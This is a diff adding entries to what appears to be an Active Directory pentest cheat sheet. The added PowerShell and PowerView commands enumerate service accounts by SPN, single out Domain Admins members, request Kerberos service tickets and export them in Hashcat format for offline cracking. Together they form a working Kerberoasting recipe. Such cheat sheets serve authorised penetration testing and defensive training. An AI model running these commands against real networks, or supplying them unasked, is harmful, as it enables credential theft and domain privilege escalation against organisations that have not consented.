@@ -260,6 +260,10 @@ Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrinci
 $FormatEnumerationLimit=-1
 Get-ADComputer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName | Out-String -Width 4096
 ```
+```
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+```
 ##### KERBEROASTING - LIST ALL SPN
 ```
 $MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
@@ -282,7 +286,15 @@ foreach($result in $MyResults)
   Write-host ""
   }
 ```
-
+##### KERBEROASTING - REQUEST A TGS TICKET
+```
+Add-Type -Assemblyname System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist "HTTP/MyServiceComputer.TECH.LOCAL"
+```
+```
+Request-SPNTicket -SPN "HTTP/MyServiceComputer.TECH.LOCAL" -Format Hashcat
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+```
 
 # POWERSHELL
 ## DOWNLOAD
